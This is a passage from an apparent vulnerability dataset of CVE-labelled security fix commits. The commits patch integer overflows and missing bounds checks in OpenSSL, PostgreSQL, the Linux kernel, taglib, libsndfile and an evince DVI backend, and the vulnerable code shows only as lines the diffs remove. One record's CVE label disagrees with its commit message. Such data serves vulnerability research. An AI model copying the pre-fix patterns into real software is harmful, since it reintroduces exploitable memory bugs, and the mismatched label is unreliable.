a\/backend\/dvi\/mdvi-lib\/tfmfile.c\n+++ b\/backend\/dvi\/mdvi-lib\/tfmfile.c\n@@ -172,7 +172,8 @@ int\ttfm_load_file(const char *filename, TFMInfo *info)\n \t\/* We read the entire TFM file into core *\/\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t\/* according to the spec, TFM files are smaller than 16K *\/\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t\/* allocate a word-aligned buffer to hold the file *\/\ndiff --git a\/backend\/dvi\/mdvi-lib\/vf.c b\/backend\/dvi\/mdvi-lib\/vf.c\nindex fb498476..a5ae3bbe 100644\n--- a\/backend\/dvi\/mdvi-lib\/vf.c\n+++ b\/backend\/dvi\/mdvi-lib\/vf.c\n@@ -165,6 +165,12 @@ static int vf_load_font(DviParams *params, DviFont *font)\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\/* TeX engines do not support char codes bigger than 65535 *\/\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-2106","CWE_ID":"189","category":"security","commit_id":"3f3582139fbb259a1c3cbb0a25236500a409bf26","commit_message":"From 3f3582139fbb259a1c3cbb0a25236500a409bf26 Mon Sep 17 00:00:00 2001\nFrom: Matt Caswell <matt@openssl.org>\nDate: Thu, 3 Mar 2016 23:36:23 +0000\nSubject: [PATCH] Fix encrypt overflow\n\nAn overflow can occur in the EVP_EncryptUpdate function. If an attacker is\nable to supply very large amounts of input data after a previous call to\nEVP_EncryptUpdate with a partial block then a length check can overflow\nresulting in a heap corruption.\n\nFollowing an analysis of all OpenSSL internal usage of the\nEVP_EncryptUpdate function all usage is one of two forms.\n\nThe first form is like this:\nEVP_EncryptInit()\nEVP_EncryptUpdate()\n\ni.e. where the EVP_EncryptUpdate() call is known to be the first called\nfunction after an EVP_EncryptInit(), and therefore that specific call\nmust be safe.\n\nThe second form is where the length passed to EVP_EncryptUpdate() can be\nseen from the code to be some small value and therefore there is no\npossibility of an overflow.\n\nSince all instances are one of these two forms, I believe that there can\nbe no overflows in internal code due to this problem.\n\nIt should be noted that EVP_DecryptUpdate() can call EVP_EncryptUpdate()\nin certain code paths. Also EVP_CipherUpdate() is a synonym for\nEVP_EncryptUpdate(). Therefore I have checked all instances of these\ncalls too, and came to the same conclusion, i.e. there are no instances\nin internal usage where an overflow could occur.\n\nThis could still represent a security issue for end user code that calls\nthis function directly.\n\nCVE-2016-2106\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Tim Hudson <tjh@openssl.org>\n---\n crypto\/evp\/evp_enc.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/crypto\/evp\/evp_enc.c b\/crypto\/evp\/evp_enc.c\nindex d7cc1f453c..e02e801949 100644\n--- a\/crypto\/evp\/evp_enc.c\n+++ b\/crypto\/evp\/evp_enc.c\n@@ -332,7 +332,7 @@ int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n     bl = ctx->cipher->block_size;\n     OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n     if (i != 0) {\n-        if (i + inl < bl) {\n+        if (bl - i > inl) {\n             memcpy(&(ctx->buf[i]), in, inl);\n             ctx->buf_len += inl;\n             *outl = 0;\n-- \n2.17.1\n\n","owner":"openssl","repo":"openssl","source":"cve"},{"CVE_ID":"CVE-2012-1584","CWE_ID":"189","category":"security","commit_id":"dcdf4fd954e3213c355746fa15b7480461972308","commit_message":"From dcdf4fd954e3213c355746fa15b7480461972308 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Luk=C3=A1=C5=A1=20Lalinsk=C3=BD?= <lalinsky@gmail.com>\nDate: Sat, 10 Mar 2012 08:46:20 +0100\nSubject: [PATCH] Avoid uint overflow in case the length + index is over\n UINT_MAX\n\n---\n taglib\/toolkit\/tbytevector.cpp | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/taglib\/toolkit\/tbytevector.cpp b\/taglib\/toolkit\/tbytevector.cpp\nindex 5edbfbfe5..cb6a5a0fc 100644\n--- a\/taglib\/toolkit\/tbytevector.cpp\n+++ b\/taglib\/toolkit\/tbytevector.cpp\n@@ -363,7 +363,7 @@ ByteVector ByteVector::mid(uint index, uint length) const\n \n   ConstIterator endIt;\n \n-  if(length < 0xffffffff && length + index < size())\n+  if(length < size() - index)\n     endIt = d->data.begin() + index + length;\n   else\n     endIt = d->data.end();\n","owner":"taglib","repo":"taglib","source":"cve"},{"CVE_ID":"CVE-2012-2675","CWE_ID":"189","category":"security","commit_id":"1a759756639ab7543b650a10c2d77a0ffc7a2000","commit_message":"From 1a759756639ab7543b650a10c2d77a0ffc7a2000 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Sat, 14 Apr 2012 16:48:07 -0400\nSubject: [PATCH] Avoid overflowing allocation size in CallMalloc()\n\nThe wraparound could happen if USE_MAGIC_HEADERS is enabled.\n---\n nedmalloc.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/nedmalloc.c b\/nedmalloc.c\nindex 7170574..0f99a8a 100644\n--- a\/nedmalloc.c\n+++ b\/nedmalloc.c\n@@ -328,7 +328,11 @@ static FORCEINLINE NEDMALLOCNOALIASATTR NEDMALLOCPTRATTR void *CallMalloc(void *\n #if USE_MAGIC_HEADERS\n \tsize_t _alignment=alignment;\n \tsize_t *_ret=0;\n-\tsize+=alignment+3*sizeof(size_t);\n+\tsize_t bytes=size+alignment+3*sizeof(size_t);\n+\t\/* Avoid addition overflow. *\/\n+\tif(bytes<size)\n+\t\treturn 0;\n+\tsize=bytes;\n \t_alignment=0;\n #endif\n #if USE_ALLOCATOR==0\n","owner":"ned14","repo":"nedmalloc","source":"cve"},{"CVE_ID":"CVE-2010-2641","CWE_ID":"189","category":"security","commit_id":"d4139205b010ed06310d14284e63114e88ec6de2","commit_message":"From d4139205b010ed06310d14284e63114e88ec6de2 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jos=C3=A9=20Aliste?= <jaliste@src.gnome.org>\nDate: Tue, 7 Dec 2010 15:56:47 -0300\nSubject: [PATCH] backends: Fix several security issues in the dvi-backend.\n\nSee CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.\n---\n backend\/dvi\/mdvi-lib\/afmparse.c |  2 +-\n backend\/dvi\/mdvi-lib\/dviread.c  |  4 ++++\n backend\/dvi\/mdvi-lib\/pk.c       | 11 ++++++++++-\n backend\/dvi\/mdvi-lib\/tfmfile.c  |  3 ++-\n backend\/dvi\/mdvi-lib\/vf.c       |  6 ++++++\n 5 files changed, 23 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 164366b0..361e23d6 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -160,7 +160,7 @@ static char *token(FILE *stream)\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\ndiff --git a\/backend\/dvi\/mdvi-lib\/dviread.c b\/backend\/dvi\/mdvi-lib\/dviread.c\nindex cd8cfa91..d0143205 100644\n--- a\/backend\/dvi\/mdvi-lib\/dviread.c\n+++ b\/backend\/dvi\/mdvi-lib\/dviread.c\n@@ -1507,6 +1507,10 @@ int\tspecial(DviContext *dvi, int opcode)\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;\ndiff --git a\/backend\/dvi\/mdvi-lib\/pk.c b\/backend\/dvi\/mdvi-lib\/pk.c\nindex a5791869..08377e63 100644\n--- a\/backend\/dvi\/mdvi-lib\/pk.c\n+++ b\/backend\/dvi\/mdvi-lib\/pk.c\n@@ -469,6 +469,15 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t\/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*\/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -512,7 +521,7 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t}\n \n \t\/* resize font char data *\/\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,\ndiff --git a\/backend\/dvi\/mdvi-lib\/tfmfile.c b\/backend\/dvi\/mdvi-lib\/tfmfile.c\nindex 73ebf26a..8c2a30b2 100644\n--- a\/backend\/dvi\/mdvi-lib\/tfmfile.c\n+++ b\/backend\/dvi\/mdvi-lib\/tfmfile.c\n@@ -172,7 +172,8 @@ int\ttfm_load_file(const char *filename, TFMInfo *info)\n \t\/* We read the entire TFM file into core *\/\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t\/* according to the spec, TFM files are smaller than 16K *\/\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t\/* allocate a word-aligned buffer to hold the file *\/\ndiff --git a\/backend\/dvi\/mdvi-lib\/vf.c b\/backend\/dvi\/mdvi-lib\/vf.c\nindex fb498476..a5ae3bbe 100644\n--- a\/backend\/dvi\/mdvi-lib\/vf.c\n+++ b\/backend\/dvi\/mdvi-lib\/vf.c\n@@ -165,6 +165,12 @@ static int vf_load_font(DviParams *params, DviFont *font)\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\/* TeX engines do not support char codes bigger than 65535 *\/\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-5707","CWE_ID":"189","category":"security","commit_id":"fdc81f45e9f57858da6351836507fbcf1b7583ee","commit_message":"From fdc81f45e9f57858da6351836507fbcf1b7583ee Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 21 Mar 2015 20:25:30 -0400\nSubject: [PATCH] sg_start_req(): use import_iovec()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n drivers\/scsi\/sg.c | 16 +++++-----------\n 1 file changed, 5 insertions(+), 11 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/scsi\/sg.c b\/drivers\/scsi\/sg.c\nindex b5a4db8832236..9d7b7db75e4b9 100644\n--- a\/drivers\/scsi\/sg.c\n+++ b\/drivers\/scsi\/sg.c\n@@ -1744,21 +1744,15 @@ sg_start_req(Sg_request *srp, unsigned char *cmd)\n \t\t\tmd->from_user = 0;\n \t}\n \n-\tif (unlikely(iov_count > MAX_UIOVEC))\n-\t\treturn -EINVAL;\n-\n \tif (iov_count) {\n-\t\tint size = sizeof(struct iovec) * iov_count;\n-\t\tstruct iovec *iov;\n+\t\tstruct iovec *iov = NULL;\n \t\tstruct iov_iter i;\n \n-\t\tiov = memdup_user(hp->dxferp, size);\n-\t\tif (IS_ERR(iov))\n-\t\t\treturn PTR_ERR(iov);\n+\t\tres = import_iovec(rw, hp->dxferp, iov_count, 0, &iov, &i);\n+\t\tif (res < 0)\n+\t\t\treturn res;\n \n-\t\tiov_iter_init(&i, rw, iov, iov_count,\n-\t\t\t      min_t(size_t, hp->dxfer_len,\n-\t\t\t\t    iov_length(iov, iov_count)));\n+\t\tiov_iter_truncate(&i, hp->dxfer_len);\n \n \t\tres = blk_rq_map_user_iov(q, rq, md, &i, GFP_ATOMIC);\n \t\tkfree(iov);\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2798","CWE_ID":"189","category":"security","commit_id":"728a756b8fcd22d80e2dbba8117a8a3aafd3f203","commit_message":"From 728a756b8fcd22d80e2dbba8117a8a3aafd3f203 Mon Sep 17 00:00:00 2001\nFrom: Bob Peterson <rpeterso@redhat.com>\nDate: Wed, 14 Jul 2010 18:12:26 -0400\nSubject: GFS2: rename causes kernel Oops\n\nThis patch fixes a kernel Oops in the GFS2 rename code.\n\nThe problem was in the way the gfs2 directory code was trying\nto re-use sentinel directory entries.\n\nIn the failing case, gfs2's rename function was renaming a\nfile to another name that had the same non-trivial length.\nThe file being renamed happened to be the first directory\nentry on the leaf block.\n\nFirst, the rename code (gfs2_rename in ops_inode.c) found the\noriginal directory entry and decided it could do its job by\nsimply replacing the directory entry with another.  Therefore\nit determined correctly that no block allocations were needed.\n\nNext, the rename code deleted the old directory entry prior to\nreplacing it with the new name.  Therefore, the soon-to-be\nreplaced directory entry was temporarily made into a directory\nentry \"sentinel\" or a place holder at the start of a leaf block.\n\nLastly, it went to re-add the replacement directory entry in\nthat leaf block.  However, when gfs2_dirent_find_space was\nlooking for space in the leaf block, it used the wrong value\nfor the sentinel.  That threw off its calculations so later\nit decides it can't really re-use the sentinel and therefore\nmust allocate a new leaf block.  But because it previously decided\nto re-use the directory entry, it didn't waste the time to\ngrab a new block allocation for the inode.  Therefore, the\ninode's i_alloc pointer was still NULL and it crashes trying to\nreference it.\n\nIn the case of sentinel directory entries, the entire dirent is\nreused, not just the \"free space\" portion of it, and therefore\nthe function gfs2_dirent_find_space should use the value 0\nrather than GFS2_DIRENT_SIZE(0) for the actual dirent size.\n\nFixing this calculation enables the reproducer programs to work\nproperly.\n\nSigned-off-by: Bob Peterson <rpeterso@redhat.com>\nSigned-off-by: Steven Whitehouse <swhiteho@redhat.com>\n---\n fs\/gfs2\/dir.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/gfs2\/dir.c b\/fs\/gfs2\/dir.c\nindex 8295c5b5d4a9..26ca3361a8bc 100644\n--- a\/fs\/gfs2\/dir.c\n+++ b\/fs\/gfs2\/dir.c\n@@ -392,7 +392,7 @@ static int gfs2_dirent_find_space(const struct gfs2_dirent *dent,\n \tunsigned totlen = be16_to_cpu(dent->de_rec_len);\n \n \tif (gfs2_dirent_sentinel(dent))\n-\t\tactual = GFS2_DIRENT_SIZE(0);\n+\t\tactual = 0;\n \tif (totlen - actual >= required)\n \t\treturn 1;\n \treturn 0;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9756","CWE_ID":"189","category":"security","commit_id":"725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6","commit_message":"From 725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6 Mon Sep 17 00:00:00 2001\nFrom: Erik de Castro Lopo <erikd@mega-nerd.com>\nDate: Wed, 24 Dec 2014 21:02:35 +1100\nSubject: [PATCH] src\/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https:\/\/github.com\/erikd\/libsndfile\/issues\/92\n---\n src\/file_io.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/file_io.c b\/src\/file_io.c\nindex 26d3d6d6..6ccab78e 100644\n--- a\/src\/file_io.c\n+++ b\/src\/file_io.c\n@@ -1,5 +1,5 @@\n \/*\n-** Copyright (C) 2002-2013 Erik de Castro Lopo <erikd@mega-nerd.com>\n+** Copyright (C) 2002-2014 Erik de Castro Lopo <erikd@mega-nerd.com>\n ** Copyright (C) 2003 Ross Bencina <rbencina@iprimus.com.au>\n **\n ** This program is free software; you can redistribute it and\/or modify\n@@ -358,6 +358,9 @@ psf_fwrite (const void *ptr, sf_count_t bytes, sf_count_t items, SF_PRIVATE *psf\n {\tsf_count_t total = 0 ;\n \tssize_t\tcount ;\n \n+\tif (bytes == 0 || items == 0)\n+\t\treturn 0 ;\n+\n \tif (psf->virtual_io)\n \t\treturn psf->vio.write (ptr, bytes*items, psf->vio_user_data) \/ bytes ;\n \n","owner":"erikd","repo":"libsndfile","source":"cve"},{"CVE_ID":"CVE-2014-2669","CWE_ID":"189","category":"security","commit_id":"31400a673325147e1205326008e32135a78b4d8a","commit_message":"From 31400a673325147e1205326008e32135a78b4d8a Mon Sep 17 00:00:00 2001\nFrom: Noah Misch <noah@leadboat.com>\nDate: Mon, 17 Feb 2014 09:33:31 -0500\nSubject: [PATCH] Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064\n---\n contrib\/hstore\/hstore.h              | 15 ++++++++++---\n contrib\/hstore\/hstore_io.c           | 21 ++++++++++++++++++\n contrib\/hstore\/hstore_op.c           | 15 +++++++++++++\n contrib\/intarray\/_int.h              |  2 ++\n contrib\/intarray\/_int_bool.c         |  9 ++++++++\n contrib\/ltree\/ltree.h                |  3 +++\n contrib\/ltree\/ltree_io.c             | 11 ++++++++++\n contrib\/ltree\/ltxtquery_io.c         | 13 ++++++++++-\n src\/backend\/utils\/adt\/geo_ops.c      | 30 ++++++++++++++++++++++++--\n src\/backend\/utils\/adt\/tsquery.c      |  7 +++++-\n src\/backend\/utils\/adt\/tsquery_util.c |  5 +++++\n src\/backend\/utils\/adt\/txid.c         | 23 +++++++++++---------\n src\/backend\/utils\/adt\/varbit.c       | 32 ++++++++++++++++++++++++++--\n src\/include\/tsearch\/ts_type.h        |  3 +++\n src\/include\/utils\/varbit.h           |  7 ++++++\n 15 files changed, 177 insertions(+), 19 deletions(-)\n\n","diff_code":"diff --git a\/contrib\/hstore\/hstore.h b\/contrib\/hstore\/hstore.h\nindex 23c8a6f0e288..37e46118531a 100644\n--- a\/contrib\/hstore\/hstore.h\n+++ b\/contrib\/hstore\/hstore.h\n@@ -49,9 +49,12 @@ typedef struct\n } HStore;\n \n \/*\n- * it's not possible to get more than 2^28 items into an hstore,\n- * so we reserve the top few bits of the size field. See hstore_compat.c\n- * for one reason why.\tSome bits are left for future use here.\n+ * It's not possible to get more than 2^28 items into an hstore, so we reserve\n+ * the top few bits of the size field.  See hstore_compat.c for one reason\n+ * why.  Some bits are left for future use here.  MaxAllocSize makes the\n+ * practical count limit slightly more than 2^28 \/ 3, or INT_MAX \/ 24, the\n+ * limit for an hstore full of 4-byte keys and null values.  Therefore, we\n+ * don't explicitly check the format-imposed limit.\n  *\/\n #define HS_FLAG_NEWVERSION 0x80000000\n \n@@ -59,6 +62,12 @@ typedef struct\n #define HS_SETCOUNT(hsp_,c_) ((hsp_)->size_ = (c_) | HS_FLAG_NEWVERSION)\n \n \n+\/*\n+ * \"x\" comes from an existing HS_COUNT() (as discussed, <= INT_MAX\/24) or a\n+ * Pairs array length (due to MaxAllocSize, <= INT_MAX\/40).  \"lenstr\" is no\n+ * more than INT_MAX, that extreme case arising in hstore_from_arrays().\n+ * Therefore, this calculation is limited to about INT_MAX \/ 5 + INT_MAX.\n+ *\/\n #define HSHRDSIZE\t(sizeof(HStore))\n #define CALCDATASIZE(x, lenstr) ( (x) * 2 * sizeof(HEntry) + HSHRDSIZE + (lenstr) )\n \ndiff --git a\/contrib\/hstore\/hstore_io.c b\/contrib\/hstore\/hstore_io.c\nindex 973a1265c1d4..6dd3f7c24eb6 100644\n--- a\/contrib\/hstore\/hstore_io.c\n+++ b\/contrib\/hstore\/hstore_io.c\n@@ -13,6 +13,7 @@\n #include \"utils\/builtins.h\"\n #include \"utils\/json.h\"\n #include \"utils\/lsyscache.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/typcache.h\"\n \n #include \"hstore.h\"\n@@ -439,6 +440,11 @@ hstore_recv(PG_FUNCTION_ARGS)\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n+\tif (pcount < 0 || pcount > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t pcount, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n \tpairs = palloc(pcount * sizeof(Pairs));\n \n \tfor (i = 0; i < pcount; ++i)\n@@ -554,6 +560,13 @@ hstore_from_arrays(PG_FUNCTION_ARGS)\n \t\t\t\t\t  TEXTOID, -1, false, 'i',\n \t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n \n+\t\/* see discussion in hstoreArrayToPairs() *\/\n+\tif (key_count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t key_count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \t\/* value_array might be NULL *\/\n \n \tif (PG_ARGISNULL(1))\n@@ -676,6 +689,13 @@ hstore_from_array(PG_FUNCTION_ARGS)\n \n \tcount = in_count \/ 2;\n \n+\t\/* see discussion in hstoreArrayToPairs() *\/\n+\tif (count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \tpairs = palloc(count * sizeof(Pairs));\n \n \tfor (i = 0; i < count; ++i)\n@@ -807,6 +827,7 @@ hstore_from_record(PG_FUNCTION_ARGS)\n \t\tmy_extra->ncolumns = ncolumns;\n \t}\n \n+\tAssert(ncolumns <= MaxTupleAttributeNumber);\t\t\/* thus, no overflow *\/\n \tpairs = palloc(ncolumns * sizeof(Pairs));\n \n \tif (rec)\ndiff --git a\/contrib\/hstore\/hstore_op.c b\/contrib\/hstore\/hstore_op.c\nindex 45edb048ceb7..8ba7a05a6593 100644\n--- a\/contrib\/hstore\/hstore_op.c\n+++ b\/contrib\/hstore\/hstore_op.c\n@@ -8,6 +8,7 @@\n #include \"catalog\/pg_type.h\"\n #include \"funcapi.h\"\n #include \"utils\/builtins.h\"\n+#include \"utils\/memutils.h\"\n \n #include \"hstore.h\"\n \n@@ -90,6 +91,19 @@ hstoreArrayToPairs(ArrayType *a, int *npairs)\n \t\treturn NULL;\n \t}\n \n+\t\/*\n+\t * A text array uses at least eight bytes per element, so any overflow in\n+\t * \"key_count * sizeof(Pairs)\" is small enough for palloc() to catch.\n+\t * However, credible improvements to the array format could invalidate\n+\t * that assumption.  Therefore, use an explicit check rather than relying\n+\t * on palloc() to complain.\n+\t *\/\n+\tif (key_count > MaxAllocSize \/ sizeof(Pairs))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t key_count, (int) (MaxAllocSize \/ sizeof(Pairs)))));\n+\n \tkey_pairs = palloc(sizeof(Pairs) * key_count);\n \n \tfor (i = 0, j = 0; i < key_count; i++)\n@@ -648,6 +662,7 @@ hstore_slice_to_hstore(PG_FUNCTION_ARGS)\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n+\t\/* hstoreArrayToPairs() checked overflow *\/\n \tout_pairs = palloc(sizeof(Pairs) * nkeys);\n \tbufsiz = 0;\n \ndiff --git a\/contrib\/intarray\/_int.h b\/contrib\/intarray\/_int.h\nindex 56aa23cfde0d..7f93206e890b 100644\n--- a\/contrib\/intarray\/_int.h\n+++ b\/contrib\/intarray\/_int.h\n@@ -5,6 +5,7 @@\n #define ___INT_H__\n \n #include \"utils\/array.h\"\n+#include \"utils\/memutils.h\"\n \n \/* number ranges for compression *\/\n #define MAXNUMRANGE 100\n@@ -137,6 +138,7 @@ typedef struct QUERYTYPE\n \n #define HDRSIZEQT\toffsetof(QUERYTYPE, items)\n #define COMPUTESIZE(size)\t( HDRSIZEQT + (size) * sizeof(ITEM) )\n+#define QUERYTYPEMAXITEMS\t((MaxAllocSize - HDRSIZEQT) \/ sizeof(ITEM))\n #define GETQUERY(x)  ( (x)->items )\n \n \/* \"type\" codes for ITEM *\/\ndiff --git a\/contrib\/intarray\/_int_bool.c b\/contrib\/intarray\/_int_bool.c\nindex d0572afc1e34..b18e997748be 100644\n--- a\/contrib\/intarray\/_int_bool.c\n+++ b\/contrib\/intarray\/_int_bool.c\n@@ -448,6 +448,9 @@ boolop(PG_FUNCTION_ARGS)\n static void\n findoprnd(ITEM *ptr, int32 *pos)\n {\n+\t\/* since this function recurses, it could be driven to stack overflow. *\/\n+\tcheck_stack_depth();\n+\n #ifdef BS_DEBUG\n \telog(DEBUG3, (ptr[*pos].type == OPR) ?\n \t\t \"%d  %c\" : \"%d  %d\", *pos, ptr[*pos].val);\n@@ -508,7 +511,13 @@ bqarr_in(PG_FUNCTION_ARGS)\n \t\t\t\t(errcode(ERRCODE_INVALID_PARAMETER_VALUE),\n \t\t\t\t errmsg(\"empty query\")));\n \n+\tif (state.num > QUERYTYPEMAXITEMS)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\terrmsg(\"number of query items (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t   state.num, (int) QUERYTYPEMAXITEMS)));\n \tcommonlen = COMPUTESIZE(state.num);\n+\n \tquery = (QUERYTYPE *) palloc(commonlen);\n \tSET_VARSIZE(query, commonlen);\n \tquery->size = state.num;\ndiff --git a\/contrib\/ltree\/ltree.h b\/contrib\/ltree\/ltree.h\nindex 563970a67a45..1b1305b48393 100644\n--- a\/contrib\/ltree\/ltree.h\n+++ b\/contrib\/ltree\/ltree.h\n@@ -5,6 +5,7 @@\n \n #include \"fmgr.h\"\n #include \"tsearch\/ts_locale.h\"\n+#include \"utils\/memutils.h\"\n \n typedef struct\n {\n@@ -111,6 +112,8 @@ typedef struct\n \n #define HDRSIZEQT\t\tMAXALIGN(VARHDRSZ + sizeof(int32))\n #define COMPUTESIZE(size,lenofoperand)\t( HDRSIZEQT + (size) * sizeof(ITEM) + (lenofoperand) )\n+#define LTXTQUERY_TOO_BIG(size,lenofoperand) \\\n+\t((size) > (MaxAllocSize - HDRSIZEQT - (lenofoperand)) \/ sizeof(ITEM))\n #define GETQUERY(x)  (ITEM*)( (char*)(x)+HDRSIZEQT )\n #define GETOPERAND(x)\t( (char*)GETQUERY(x) + ((ltxtquery*)x)->size * sizeof(ITEM) )\n \ndiff --git a\/contrib\/ltree\/ltree_io.c b\/contrib\/ltree\/ltree_io.c\nindex 3e88b81c16e3..d64debb5f49b 100644\n--- a\/contrib\/ltree\/ltree_io.c\n+++ b\/contrib\/ltree\/ltree_io.c\n@@ -8,6 +8,7 @@\n #include <ctype.h>\n \n #include \"ltree.h\"\n+#include \"utils\/memutils.h\"\n #include \"crc32.h\"\n \n PG_FUNCTION_INFO_V1(ltree_in);\n@@ -64,6 +65,11 @@ ltree_in(PG_FUNCTION_ARGS)\n \t\tptr += charlen;\n \t}\n \n+\tif (num + 1 > MaxAllocSize \/ sizeof(nodeitem))\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t errmsg(\"number of levels (%d) exceeds the maximum allowed (%d)\",\n+\t\t\t\t\tnum + 1, (int) (MaxAllocSize \/ sizeof(nodeitem)))));\n \tlist = lptr = (nodeitem *) palloc(sizeof(nodeitem) * (num + 1));\n \tptr = buf;\n \twhile (*ptr)\n@@ -228,6 +234,11 @@ lquery_in(PG_FUNCTION_ARGS)\n \t}\n \n \tnum++;\n+\tif (num > MaxAllocSize \/ 